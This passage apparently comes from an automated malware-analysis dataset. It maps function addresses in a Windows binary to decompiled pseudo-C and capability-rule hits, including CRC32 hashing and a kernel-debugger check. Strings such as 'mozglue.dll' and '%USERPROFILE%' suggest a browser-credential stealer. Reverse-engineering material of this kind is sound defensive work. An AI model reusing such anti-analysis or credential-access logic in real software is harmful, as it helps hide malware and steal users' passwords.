*0x4488ec;\n                arg_ch = *0x4488e8;\n            }\n        }\n        else if (arg_14h != 0) goto code_r0x00421561;\n        if (-1 < arg_10h) {\n            uVar2 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n            iVar4 = uVar2 >> 0x1f;\n            if ((arg_10h <= iVar4) && ((arg_10h < iVar4 || (arg_ch <= uVar2)))) {\n                iVar5 = (**(in_ECX + 0x10) - iVar5) + arg_ch;\n                **(in_ECX + 0x30) = **(in_ECX + 0x30) - iVar5;\n                **(in_ECX + 0x20) = **(in_ECX + 0x20) + iVar5;\n                if (((arg_18h & 2) != 0) && (iVar5 = **(in_ECX + 0x24),  iVar5 != 0)) {\n                    iVar4 = **(in_ECX + 0x34);\n                    iVar1 = **(in_ECX + 0x20);\n                    **(in_ECX + 0x24) = iVar1;\n                    **(in_ECX + 0x34) = (iVar4 + iVar5) - iVar1;\n                }\n                goto code_r0x0042168d;\n            }\n        }\n    }\n    arg_10h = *0x4488ec;\n    arg_ch = *0x4488e8;\ncode_r0x0042168d:\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 1294
    },
    "004216b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004216b0(uint32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, uint noname_4, uint noname_5, \n            uint noname_6, uint32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_4h;\n    \n    uVar8 = arg_14h + arg_ch;\n    uVar7 = **(in_ECX + 0x24);\n    uVar6 = (arg_14h >> 0x1f) + arg_10h + CARRY4(arg_14h, arg_ch);\n    if ((uVar7 != 0) && (*(in_ECX + 0x3c) < uVar7)) {\n        *(in_ECX + 0x3c) = uVar7;\n    }\n    if ((uVar8 != *0x4488e8) || (uVar7 = uVar6,  uVar9 = uVar8,  uVar6 != *0x4488ec)) {\n        uVar7 = *0x4488ec;\n        uVar9 = *0x4488e8;\n        if (((arg_24h & 1) == 0) || (**(in_ECX + 0x20) == 0)) {\n            if ((((arg_24h & 2) != 0) && (uVar3 = **(in_ECX + 0x24),  uVar3 != 0)) && (-1 < uVar6)) {\n                uVar4 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n                iVar5 = uVar4 >> 0x1f;\n                if ((uVar6 <= iVar5) && ((uVar6 < iVar5 || (uVar8 <= uVar4)))) {\n                    iVar5 = (**(in_ECX + 0x10) - uVar3) + uVar8;\n                    **(in_ECX + 0x34) = **(in_ECX + 0x34) - iVar5;\n                    **(in_ECX + 0x24) = **(in_ECX + 0x24) + iVar5;\n                    uVar7 = uVar6;\n                    uVar9 = uVar8;\n                }\n            }\n        }\n        else if (-1 < uVar6) {\n            uVar3 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n            iVar5 = uVar3 >> 0x1f;\n            if ((uVar6 <= iVar5) && ((uVar6 < iVar5 || (uVar8 <= uVar3)))) {\n                iVar5 = (**(in_ECX + 0x10) - **(in_ECX + 0x20)) + uVar8;\n                **(in_ECX + 0x30) = **(in_ECX + 0x30) - iVar5;\n                **(in_ECX + 0x20) = **(in_ECX + 0x20) + iVar5;\n                uVar7 = uVar6;\n                uVar9 = uVar8;\n                if (((arg_24h & 2) != 0) && (iVar5 = **(in_ECX + 0x24),  iVar5 != 0)) {\n                    iVar1 = **(in_ECX + 0x20);\n                    iVar2 = **(in_ECX + 0x34);\n                    **(in_ECX + 0x24) = iVar1;\n                    **(in_ECX + 0x34) = (iVar2 + iVar5) - iVar1;\n                }\n            }\n        }\n    }\n    *arg_8h = uVar9;\n    arg_8h[1] = uVar7;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 964
    },
    "004217d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004217d0(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    \n    piVar1 = in_ECX + -2;\n    *(*(*piVar1 + 4) + -8 + in_ECX) = 0x4480e0;\n    *in_ECX = 0x4473d0;\n    fcn.0042a8d9(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49(piVar1);\n    }\n    return piVar1;\n}\n",
        "token_count": 144
    },
    "00421810": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00421810(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    \n    piVar1 = in_ECX + -6;\n    *(*(*piVar1 + 4) + -0x18 + in_ECX) = \"%USERPROFILE%\";\n    *(*(in_ECX[-2] + 4) + -8 + in_ECX) = 0x4480e0;\n    *(*(in_ECX[-6] + 4) + -0x18 + in_ECX) = 0x44792c;\n    *in_ECX = 0x4473d0;\n    fcn.0042a8d9(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49(piVar1);\n    }\n    return piVar1;\n}\n",
        "token_count": 202
    },
    "00421870": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421870(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4480f4;\n    fcn.004213b0();\n    fcn.00418c30();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00421c40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421c40(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t arg_8h_00;\n    int32_t iVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_ECX + 0x40) & 8) != 0) {\n        uVar7 = **(in_ECX + 0x24);\n        if ((uVar7 != 0) && (uVar4 = *(in_ECX + 0x3c),  uVar7 < uVar4)) {\n            iVar1 = **(in_ECX + 0x34);\n            **(in_ECX + 0x24) = uVar4;\n            **(in_ECX + 0x34) = (iVar1 + uVar7) - uVar4;\n        }\n    }\n    if (arg_8h == -1) {\n        return 0;\n    }\n    uVar7 = **(in_ECX + 0x24);\n    if ((uVar7 != 0) && (piVar2 = *(in_ECX + 0x34),  uVar7 < *piVar2 + uVar7)) {\n        *piVar2 = *piVar2 + -1;\n        goto code_r0x00421dcd;\n    }\n    if ((*(in_ECX + 0x40) & 2) != 0) {\n        return -1;\n    }\n    if (uVar7 == 0) {\n        uVar7 = 0;\n    }\n    else {\n        uVar7 = (**(in_ECX + 0x34) - **(in_ECX + 0x10)) + uVar7;\n    }\n    uVar4 = uVar7 >> 1;\n    if (uVar4 < 0x20) {\n        uVar4 = 0x20;\n    }\n    else if (uVar4 == 0) {\n        return -1;\n    }\n    do {\n        if (uVar7 <= 0x7fffffff - uVar4) break;\n        uVar4 = uVar4 >> 1;\n    } while (uVar4 != 0);\n    if (uVar4 == 0) {\n        return -1;\n    }\n    iVar5 = uVar4 + uVar7;\n    arg_8h_00 = fcn.00405b20(iVar5);\n    iVar1 = **(in_ECX + 0x10);\n    if ((uVar7 == 0) || (fcn.0042af40(arg_8h_00, iVar1, uVar7),  uVar7 == 0)) {\n        *(in_ECX + 0x3c) = arg_8h_00;\n        **(in_ECX + 0x14) = arg_8h_00;\n        **(in_ECX + 0x24) = arg_8h_00;\n        **(in_ECX + 0x34) = iVar5;\n        if ((*(in_ECX + 0x40) & 4) != 0) goto code_r0x00421d7d;\n        **(in_ECX + 0x10) = arg_8h_00;\n        **(in_ECX + 0x20) = arg_8h_00;\n        **(in_ECX + 0x30) = 1;\n    }\n    else {\n        *(in_ECX + 0x3c) = *(in_ECX + 0x3c) + (arg_8h_00 - iVar1);\n        iVar6 = **(in_ECX + 0x24);\n        **(in_ECX + 0x14) = **(in_ECX + 0x14) + (arg_8h_00 - iVar1);\n        iVar6 = (iVar6 - iVar1) + arg_8h_00;\n        **(in_ECX + 0x24) = iVar6;\n        **(in_ECX + 0x34) = (arg_8h_00 - iVar6) + iVar5;\n        if ((*(in_ECX + 0x40) & 4) == 0) {\n            iVar5 = **(in_ECX + 0x24);\n            iVar6 = (**(in_ECX + 0x20) - iVar1) + arg_8h_00;\n            **(in_ECX + 0x10) = arg_8h_00;\n            **(in_ECX + 0x20) = iVar6;\n            **(in_ECX + 0x30) = (iVar5 - iVar6) + 1;\n        }\n        else {\ncode_r0x00421d7d:\n            **(in_ECX + 0x10) = arg_8h_00;\n            **(in_ECX + 0x20) = 0;\n            **(in_ECX + 0x30) = arg_8h_00;\n        }\n    }\n    if ((*(in_ECX + 0x40) & 1) != 0) {\n        fcn.0042ac49(iVar1);\n    }\n    *(in_ECX + 0x40) = *(in_ECX + 0x40) | 1;\n    **(in_ECX + 0x34) = **(in_ECX + 0x34) + -1;\ncode_r0x00421dcd:\n    puVar3 = **(in_ECX + 0x24);\n    **(in_ECX + 0x24) = puVar3 + 1;\n    *puVar3 = arg_8h;\n    return arg_8h;\n}\n",
        "token_count": 1315
    },
    "00421df0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421df0(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00421aa0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49(in_ECX + -0x50);\n    }\n    return in_ECX + -0x50;\n}\n",
        "token_count": 87
    },
    "00421fa0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421fa0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t arg_8h_00;\n    bool bVar3;\n    int32_t *in_FS_OFFSET;\n    ulong uVar4;\n    uint var_34h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ea4b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    bVar3 = false;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        puVar2 = fcn.0042b9b1(0x10);\n        var_4h = 0;\n        if (puVar2 == NULL) {\n            puVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = *(*arg_ch + 0x18);\n            if (arg_8h_00 == 0) {\n                arg_8h_00 = *arg_ch + 0x1c;\n            }\n            fcn.00419140(arg_8h_00);\n            bVar3 = true;\n            puVar2[1] = 0;\n            *puVar2 = 0x44813c;\n            uVar4 = fcn.0042ab3e(arg_8h_00, uVar1);\n            puVar2[2] = uVar4;\n            puVar2[3] = uVar4 >> 0x20;\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = puVar2;\n        if (bVar3) {\n            fcn.004191f0();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 4;\n}\n",
        "token_count": 455
    },
    "00422080": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422080(uint32_t arg_8h)\n\n{\n    char **in_ECX;\n    \n    *in_ECX = \"mozglue.dll\";\n    fcn.0042c228(in_ECX[2]);\n    fcn.0042c228(in_ECX[4]);\n    fcn.0042c228(in_ECX[5]);\n    *in_ECX = 0x4473c8;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "004220f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004220f0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    fcn.00421bb0();\n    *in_ECX = 0x4473d0;\n    fcn.0042a8d9(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49(in_ECX + -0x18);\n    }\n    return in_ECX + -0x18;\n}\n",
        "token_count": 113
    },
    "00422330": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00422330(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char **ppcVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    bool bVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_38h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f47c;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    bVar4 = false;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        ppcVar2 = fcn.0042b9b1(0x18);\n        var_4h = 0;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = *(*arg_ch + 0x18);\n            if (arg_8h_00 == 0) {\n                arg_8h_00 = *arg_ch + 0x1c;\n            }\n            uVar3 = fcn.00419140(arg_8h_00);\n            bVar4 = true;\n            ppcVar2[1] = NULL;\n            var_4h = 2;\n            *ppcVar2 = \"mozglue.dll\";\n            fcn.00421960(uVar3, 1, arg_8h_00, uVar1);\n        }\n        *arg_8h = ppcVar2;\n        var_4h = 0xffffffff;\n        if (bVar4) {\n            fcn.004191f0();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 4;\n}\n",
        "token_count": 451
    },
    "004233e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004234ad)\n\nvoid __cdecl fcn.004233e0(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f65f;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_ch != 0) {\n        *in_ECX = 0x448184;\n        in_ECX[0x14] = 0x447934;\n        var_4h = 0;\n    }\n    *(in_ECX + *(*in_ECX + 4)) = 0x4480e0;\n    iVar1 = *(*in_ECX + 4);\n    fcn.00418b50(uVar3);\n    *(in_ECX + iVar1 + 0x38) = in_ECX + 1;\n    *(in_ECX + iVar1 + 0x3c) = 0;\n    uVar2 = fcn.00419b60(0x20);\n    *(in_ECX + iVar1 + 0x40) = uVar2;\n    if (*(in_ECX + iVar1 + 0x38) == 0) {\n        fcn.00418a20(*(in_ECX + iVar1 + 0xc) | 4, 0);\n    }\n    *(in_ECX + *(*in_ECX + 4)) = 0x448134;\n    var_4h = 2;\n    fcn.004194a0();\n    uVar3 = 0;\n    in_ECX[1] = 0x4480f4;\n    if ((arg_8h & 1) == 0) {\n        uVar3 = 4;\n    }\n    if ((arg_8h & 8) != 0) {\n        uVar3 = uVar3 | 8;\n    }\n    if ((arg_8h & 4) != 0) {\n        uVar3 = uVar3 | 0x10;\n    }\n    in_ECX[0x11] = uVar3;\n    in_ECX[0x10] = 0;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 587
    },
    "00423900": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00423900(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    uint arg_30h;\n    char cVar3;\n    uint in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t arg_28h;\n    bool bVar6;\n    double in_stack_00000018;\n    uint var_8ch;\n    uint var_88h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint var_78h;\n    uint var_ch;\n    uchar auStack12 [4];\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar5 = *(arg_14h + 0x18);\n    iVar1 = *(arg_14h + 0x1c);\n    arg_28h = 0;\n    if ((iVar1 < 1) && (((iVar1 < 0 || (uVar5 == 0)) && ((*(arg_14h + 0x14) & 0x2000) == 0)))) {\n        uVar5 = 6;\n        iVar1 = 0;\n    }\n    var_84h = uVar5;\n    if ((-1 < iVar1) && ((0 < iVar1 || (0x24 < uVar5)))) {\n        var_84h = 0x24;\n    }\n    uVar5 = uVar5 - var_84h;\n    iVar1 = (iVar1 - (var_84h >> 0x1f)) - (uVar5 < var_84h);\n    uVar4 = *(arg_14h + 0x14);\n    var_80h = 0;\n    if (((uVar4 & 0x3000) == 0x2000) && (in_stack_00000018 != str.arpdabl * in_stack_00000018)) {\n        if (((0.0 < in_stack_00000018) << 8 | (in_stack_00000018 == 0.0) << 0xe) == 0) {\n            in_stack_00000018 = -in_stack_00000018;\n        }\n        if (*0x4481b8 < in_stack_00000018 != (*0x4481b8 == in_stack_00000018)) {\n            do {\n                if (4999 < var_80h) break;\n                in_stack_00000018 = in_stack_00000018 / *0x4481b0;\n                var_80h = var_80h + 10;\n            } while (*0x4481b8 < in_stack_00000018 != (*0x4481b8 == in_stack_00000018));\n        }\n        if ((0.0 < in_stack_00000018) && (-1 < iVar1)) {\n            if (0 < iVar1) goto code_r0x00423a18;\n            while (9 < uVar5) {\ncode_r0x00423a18:\n                do {\n                    if ((*0x4481a8 < in_stack_00000018) || (4999 < arg_28h)) goto code_r0x00423a4d;\n                    bVar6 = 9 < uVar5;\n                    uVar5 = uVar5 - 10;\n                    iVar1 = iVar1 + -1 + bVar6;\n                    in_stack_00000018 = in_stack_00000018 * *0x4481b0;\n                    arg_28h = arg_28h + 10;\n                } while (0 < iVar1);\n                if (iVar1 < 0) break;\n            }\n        }\n    }\ncode_r0x00423a4d:\n    var_ch._0_1_ = 0x25;\n    puVar2 = &var_ch + 1;\n    if ((uVar4 & 0x20) != 0) {\n        var_ch._1_1_ = 0x2b;\n        puVar2 = &var_ch + 2;\n    }\n    if ((uVar4 & 0x10) != 0) {\n        *puVar2 = 0x23;\n        puVar2 = puVar2 + 1;\n    }\n    uVar4 = uVar4 & 0x3000;\n    *puVar2 = 0x2a2e;\n    if (uVar4 == 0x2000) {\n        cVar3 = 'f';\n    }\n    else if (uVar4 == 0x3000) {\n        cVar3 = 'a';\n    }\n    else {\n        cVar3 = (uVar4 != 0x1000) * '\\x02' + 'e';\n    }\n    *(puVar2 + 1) = cVar3;\n    *(puVar2 + 3) = 0;\n    arg_30h = fcn.0042eb89(&var_78h, 0x6c, &var_ch, var_84h);\n    fcn.00422be0(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_78h, var_80h, arg_28h, uVar5, arg_30h);\n    fcn.0042ad2a(in_ECX);\n    return;\n}\n",
        "token_count": 1241
    },
    "00423b10": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00423b10(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    uint arg_30h;\n    char cVar3;\n    uint in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t arg_28h;\n    bool bVar6;\n    double in_stack_00000018;\n    uint var_8ch;\n    uint var_88h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint var_78h;\n    uint var_ch;\n    char acStack12 [4];\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar5 = *(arg_14h + 0x18);\n    iVar1 = *(arg_14h + 0x1c);\n    arg_28h = 0;\n    if ((iVar1 < 1) && (((iVar1 < 0 || (uVar5 == 0)) && ((*(arg_14h + 0x14) & 0x2000) == 0)))) {\n        uVar5 = 6;\n        iVar1 = 0;\n    }\n    var_84h = uVar5;\n    if ((-1 < iVar1) && ((0 < iVar1 || (0x24 < uVar5)))) {\n        var_84h = 0x24;\n    }\n    uVar5 = uVar5 - var_84h;\n    iVar1 = (iVar1 - (var_84h >> 0x1f)) - (uVar5 < var_84h);\n    uVar4 = *(arg_14h + 0x14);\n    var_80h = 0;\n    if ((uVar4 & 0x3000) == 0x2000) {\n        if (in_stack_00000018 < 0.0) {\n            in_stack_00000018 = -in_stack_00000018;\n        }\n        if (*0x4481b8 < in_stack_00000018 != (*0x4481b8 == in_stack_00000018)) {\n            do {\n                if (4999 < var_80h) break;\n                in_stack_00000018 = in_stack_00000018 / *0x4481b0;\n                var_80h = var_80h + 10;\n            } while (*0x4481b8 < in_stack_00000018 != (*0x4481b8 == in_stack_00000018));\n        }\n        if ((0.0 < in_stack_00000018) && (-1 < iVar1)) {\n            if (0 < iVar1) goto code_r0x00423c0d;\n            while (9 < uVar5) {\ncode_r0x00423c0d:\n                do {\n                    if ((*0x4481a8 < in_stack_00000018) || (4999 < arg_28h)) goto code_r0x00423c4b;\n                    bVar6 = 9 < uVar5;\n                    uVar5 = uVar5 - 10;\n                    iVar1 = iVar1 + -1 + bVar6;\n                    in_stack_00000018 = in_stack_00000018 * *0x4481b0;\n                    arg_28h = arg_28h + 10;\n                } while (0 < iVar1);\n                if (iVar1 < 0) break;\n            }\n        }\n    }\ncode_r0x00423c4b:\n    var_ch._0_1_ = 0x25;\n    puVar2 = &var_ch + 1;\n    if ((uVar4 & 0x20) != 0) {\n        var_ch._1_1_ = 0x2b;\n        puVar2 = &var_ch + 2;\n    }\n    if ((uVar4 & 0x10) != 0) {\n        *puVar2 = 0x23;\n        puVar2 = puVar2 + 1;\n    }\n    uVar4 = uVar4 & 0x3000;\n    *puVar2 = 0x2a2e;\n    *(puVar2 + 1) = 0x4c;\n    if (uVar4 == 0x2000) {\n        cVar3 = 'f';\n    }\n    else if (uVar4 == 0x3000) {\n        cVar3 = 'a';\n    }\n    else {\n        cVar3 = (uVar4 != 0x1000) * '\\x02' + 'e';\n    }\n    *(puVar2 + 3) = cVar3;\n    *(puVar2 + 2) = 0;\n    arg_30h = fcn.0042eb89(&var_78h, 0x6c, &var_ch, var_84h);\n    fcn.00422be0(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_78h, var_80h, arg_28h, uVar5, arg_30h);\n    fcn.0042ad2a(in_ECX);\n    return;\n}\n",
        "token_count": 1213
    },
    "00427470": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00427470(uint arg_8h, uint32_t *arg_ch, uint32_t *arg_10h, uint *arg_14h, uint32_t *arg_18h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint unaff_EDI;\n    ulong uVar5;\n    uint arg_8h_00;\n    uint var_6ch;\n    int32_t var_68h;\n    uint32_t *var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint32_t *var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    uint32_t *var_30h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_64h = arg_ch;\n    var_58h = arg_18h;\n    arg_8h_00 = arg_8h;\n    iVar2 = (**0x4691e8)(arg_8h, &var_48h);\n    if (iVar2 == 0) {\n        fcn.0042ad2a(unaff_EDI);\n        return;\n    }\n    uVar3 = (var_48h & 1) != 0;\n    if ((var_48h & 2) != 0) {\n        uVar3 = uVar3 | 2;\n    }\n    if ((var_48h & 4) != 0) {\n        uVar3 = uVar3 | 4;\n    }\n    if ((var_48h & 0x10) != 0) {\n        uVar3 = uVar3 | 0x10;\n    }\n    if ((var_48h & 0x20) != 0) {\n        uVar3 = uVar3 | 0x20;\n    }\n    if ((var_48h & 0x10) == 0) {\n        uVar3 = uVar3 | 0x80000000;\n    }\n    else {\n        uVar3 = uVar3 | 0x40000000;\n    }\n    uVar4 = uVar3 | 0x1000000;\n    if ((var_48h & 1) == 0) {\n        uVar4 = uVar3 | 0x1800000;\n    }\n    var_50h = (**0x4692c8)(arg_8h, 0);\n    if (0x28 < var_50h) {\n        (**0x469108)(arg_8h, 0, 0, 0);\n        (**0x469214)(arg_8h, &var_4ch, 2, &var_54h, 0);\n        (**0x469108)(arg_8h, 0x24, 0, 0);\n        (**0x469214)(arg_8h, &var_68h, 4, &var_54h, 0);\n        if ((var_4ch == 0x54ad) && (var_68h + 0x34U < var_50h)) {\n            (**0x469108)(arg_8h, var_68h, 0, 0);\n            (**0x469214)(arg_8h, &var_60h, 4, &var_54h, 0);\n            if ((var_60h == 0x5a4d) || (((var_60h == 0x454e || (var_60h == 0x454c)) || (var_60h == 0x4550)))) {\n                uVar4 = uVar4 | 0x400000;\n            }\n        }\n    }\n    if (var_64h != NULL) {\n        *var_64h = uVar4;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = var_50h;\n    }\n    if (arg_14h != NULL) {\n        uVar5 = fcn.0042d920(var_3ch + 0x2ac18000, (var_38h + -0x19db1de) - (var_3ch < 0xd53e8000), 10000000, 0);\n        arg_14h[1] = uVar5 >> 0x20;\n        *arg_14h = uVar5;\n        uVar5 = fcn.0042d920(var_34h + 0x2ac18000, var_30h + (-0x19db1de - (var_34h < 0xd53e8000)), 10000000, 0);\n        arg_14h[2] = uVar5;\n        arg_14h[3] = uVar5 >> 0x20;\n        uVar5 = fcn.0042d920(var_44h + 0x2ac18000, (var_40h + -0x19db1de) - (var_44h < 0xd53e8000), 10000000, 0);\n        arg_14h[4] = uVar5;\n        arg_14h[5] = uVar5 >> 0x20;\n    }\n    puVar1 = var_58h;\n    if (var_58h != NULL) {\n        var_5ch = var_34h;\n        var_58h = var_30h;\n        (**0x4692ec)(&var_5ch, &var_14h);\n        *puVar1 = (((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 & 0x7ffU | var_14h._2_2_ & 0xf) << 5 |\n                  var_eh & 0x1f) << 0x10 | (var_ah & 0x3f | (var_eh._2_2_ & 0x1f) << 6) << 5 | var_ah._2_2_ * 2 & 0x1f;\n    }\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1494
    },
    "00427f70": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427f70(uint32_t arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (in_ECX[0x12] != 0) {\n        fcn.0042ac49(in_ECX[0x12]);\n    }\n    in_ECX[0x12] = 0;\n    if (in_ECX[0xf] != 0) {\n        fcn.0042ac49(in_ECX[0xf]);\n    }\n    in_ECX[0xf] = 0;\n    if (*in_ECX != 0) {\n        fcn.0042ac49(*in_ECX);\n    }\n    *in_ECX = 0;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00427fd0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __cdecl fcn.00427fd0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int16_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    iVar3 = 0;\n    iVar6 = 1;\n    piVar7 = arg_8h + 0xfe4;\n    do {\n        iVar3 = (*piVar7 + iVar3) * 2;\n        *(&var_24h + iVar6 * 2) = iVar3;\n        iVar6 = iVar6 + 1;\n        piVar7 = piVar7 + 1;\n    } while (iVar6 < 0x10);\n    iVar6 = 0;\n    if (-1 < arg_10h) {\n        do {\n            uVar8 = *(arg_ch + 2 + iVar6 * 4);\n            if (uVar8 != 0) {\n                uVar1 = 